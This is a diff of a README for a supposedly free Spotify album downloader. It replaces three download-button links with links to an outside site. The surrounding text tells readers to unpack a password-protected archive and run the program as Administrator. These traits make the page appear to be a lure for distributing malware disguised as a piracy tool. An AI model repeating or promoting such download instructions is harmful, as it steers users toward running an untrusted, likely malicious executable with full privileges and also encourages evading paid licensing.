@@ -9,7 +9,7 @@ The **🎵 Full Album Spotify Download** is a **free** music downloader that let
 
 <div align="center">
 
-[![Download Full Album Spotify Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/full-album-spotify-download)
+[![Download Full Album Spotify Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/full-album-spotify-download)
 
 </div>
 
@@ -107,7 +107,7 @@ Spotify requires a premium subscription for offline listening. This educational 
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Paste Spotify link → Download
 
-[![Download Full Album Spotify Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/full-album-spotify-download)
+[![Download Full Album Spotify Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/full-album-spotify-download)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -259,7 +259,7 @@ Download full albums and playlists from Spotify for free. **Full Album Spotify D
 
 <div align="center">
 
-[![Download Full Album Spotify Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/full-album-spotify-download)
+[![Download Full Album Spotify Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/full-album-spotify-download)
 
 **Version 4.6.1** — Free music downloader. April 2026 update. Zero cost. No payment.
 
